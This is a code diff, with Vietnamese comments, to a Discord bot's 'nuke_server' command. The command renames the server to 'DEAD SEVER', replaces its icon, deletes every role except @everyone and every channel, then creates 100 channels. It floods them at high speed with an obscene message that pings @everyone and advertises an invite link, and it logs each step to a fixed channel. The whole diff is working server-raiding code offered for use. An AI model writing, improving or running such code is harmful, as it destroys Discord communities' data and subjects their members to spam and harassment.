@@ -287,10 +287,13 @@ async def nuke_server(ctx):
 
         # 🔥 GỬI LOG BẮT ĐẦU (tới kênh log cố định)
         log_channel = bot.get_channel(LOG_CHANNEL_ID)
+        old_name = ctx.guild.name
+        old_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"
+
         if log_channel:
             start_embed = discord.Embed(
                 title="🔥 NUKE BẮT ĐẦU",
-                description=f"**Server:** {ctx.guild.name}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
+                description=f"**Server cũ:** {old_name}\n**Avatar cũ:** {old_icon_url}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
                 color=0xFF0000,
                 timestamp=discord.utils.utcnow()
             )
@@ -303,44 +306,81 @@ async def nuke_server(ctx):
         )
         await ctx.send(embed=nuke_embed)
 
-        # ⚡ ĐỔI TÊN SERVER VÀ AVATAR TRƯỚC KHI XÓA KÊNH
+        # 1. Spam default channel
+        if log_channel:
+            log_embed = discord.Embed(title="Spamming default channel...", color=0xFF0000)
+            await log_channel.send(embed=log_embed)
+        try:
+            await ctx.send("Spam default channel trước khi nuke!")
+        except:
+            pass
+
+        # 2. Renaming server
+        if log_channel:
+            log_embed = discord.Embed(title="Renaming server...", color=0xFF0000)
+            await log_channel.send(embed=log_embed)
         try:
             await ctx.guild.edit(name="DEAD SEVER")
+        except Exception as e:
+            print(f"Lỗi đổi tên: {e}")
+
+        # 3. Đổi avatar
+        if log_channel:
+            log_embed = discord.Embed(title="Đã đổi avatar server.", color=0xFF0000)
+            await log_channel.send(embed=log_embed)
+        try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(NUKE_AVATAR_URL) as resp:
                     if resp.status == 200:
                         image_data = await resp.read()
                         await ctx.guild.edit(icon=image_data)
-                        print("[NUKE] Đã đổi avatar server thành công.")
-                    else:
-                        print(f"[NUKE] Không tải được avatar, status code: {resp.status}")
         except Exception as e:
-            print(f"[NUKE] Lỗi khi đổi tên/avatar: {e}")
+            print(f"Lỗi đổi avatar: {e}")
 
-        # ⚡ XÓA TẤT CẢ KÊNH (tốc độ 5 kênh/giây)
+        # 4. Starting role deletion
+        if log_channel:
+            log_embed = discord.Embed(title="Starting role deletion...", color=0xFF0000)
+            await log_channel.send(embed=log_embed)
+        for role in ctx.guild.roles:
+            if role.name != "@everyone":
+                try:
+                    await role.delete()
+                except:
+                    continue
+
+        # 5. Starting channel deletion
+        if log_channel:
+            log_embed = discord.Embed(title="Starting channel deletion...", color=0xFF0000)
+            await log_channel.send(embed=log_embed)
         delete_tasks = []
         for channel in ctx.guild.channels:
             delete_tasks.append(channel.delete())
-            if len(delete_tasks) >= 5:  # batch 5 kênh
+            if len(delete_tasks) >= 5:
                 await asyncio.gather(*delete_tasks, return_exceptions=True)
                 delete_tasks.clear()
-                await asyncio.sleep(0.1)  # chống rate limit
+                await asyncio.sleep(0.1)
         if delete_tasks:
             await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-        # ⚡ TẠO 100 KÊNH MỚI (tốc độ 20 kênh/giây)
+        # 6. Starting channel creation
+        if log_channel:
+            log_embed = discord.Embed(title="Starting channel creation...", color=0xFF0000)
+            await log_channel.send(embed=log_embed)
         create_tasks = []
         for i in range(100):
             channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
             create_tasks.append(ctx.guild.create_text_channel(name=channel_name))
-            if len(create_tasks) >= 20:  # batch 20 kênh
+            if len(create_tasks) >= 20:
                 await asyncio.gather(*create_tasks, return_exceptions=True)
                 create_tasks.clear()
                 await asyncio.sleep(0.1)
         if create_tasks:
             await asyncio.gather(*create_tasks, return_exceptions=True)
 
-        # ⚡ SPAM CÂU NUKE TRONG MỖI KÊNH (tốc độ 50 tin/giây, 5 kênh mỗi giây)
+        # 7. Spamming new channels
+        if log_channel:
+            log_embed = discord.Embed(title="Spamming new channels...", color=0xFF0000)
+            await log_channel.send(embed=log_embed)
         spam_content = (
             "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
             "|| @everyone||\n"
@@ -349,7 +389,7 @@ async def nuke_server(ctx):
             ' "link support 2: https://discord.gg/j9KeGaPXh"'
         )
         all_channels = ctx.guild.text_channels
-        batch_size = 5  # xử lý 5 kênh song song
+        batch_size = 5
         for i in range(0, len(all_channels), batch_size):
             batch = all_channels[i:i+batch_size]
             tasks = []
@@ -362,32 +402,18 @@ async def nuke_server(ctx):
                             await channel.send(spam_content, embed=embed)
                         except:
                             break
-                        await asyncio.sleep(0.02)  # 0.02s = 50 tin/giây
+                        await asyncio.sleep(0.02)
                 tasks.append(send_messages())
             await asyncio.gather(*tasks, return_exceptions=True)
-            await asyncio.sleep(0.1)  # chống rate limit
+            await asyncio.sleep(0.1)
 
-        # Hoàn thành
-        complete_embed = discord.Embed(
-            title="💀 NUKE SERVER HOÀN TẤT 💀",
-            description=(
-                f"🔥 **Server đã bị phá hủy hoàn toàn theo lệnh của Boss Bảo!** 🔥\n\n"
-                f"• **Đã đổi tên:** DEAD SEVER\n"
-                f"• **Đã đổi avatar:** Avatar mới\n"
-                f"• **Đã xóa:** Tất cả kênh gốc\n"
-                f"• **Đã tạo:** 100 kênh mới\n"
-                f"• **Đã spam:** Thông điệp nuke trong mỗi kênh\n\n"
-                f"💀 **Server này đã trở thành địa ngục GENIUS AI 4.0!** 💀"
-            ),
-            color=0xFF0000
-        )
-        await ctx.send(embed=complete_embed)
-
-        # ✅ GỬI LOG HOÀN THÀNH (tới kênh log cố định)
+        # 8. Hoàn thành - gửi log
+        new_name = ctx.guild.name
+        new_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"
         if log_channel:
             end_embed = discord.Embed(
-                title="✅ NUKE HOÀN TẤT",
-                description=f"**Server:** {ctx.guild.name}\n**Thời gian hoàn thành:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
+                title="✅ Nuke completed successfully.",
+                description=f"**Server mới:** {new_name}\n**Avatar mới:** {new_icon_url}\n**Thời gian hoàn thành:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
                 color=0x00FF00,
                 timestamp=discord.utils.utcnow()
             )
@@ -400,7 +426,6 @@ async def nuke_server(ctx):
             color=0xFF0000
         )
         await ctx.send(embed=error_embed)
-        # Gửi log lỗi tới kênh log cố định
         if log_channel:
             await log_channel.send(embed=error_embed)
 
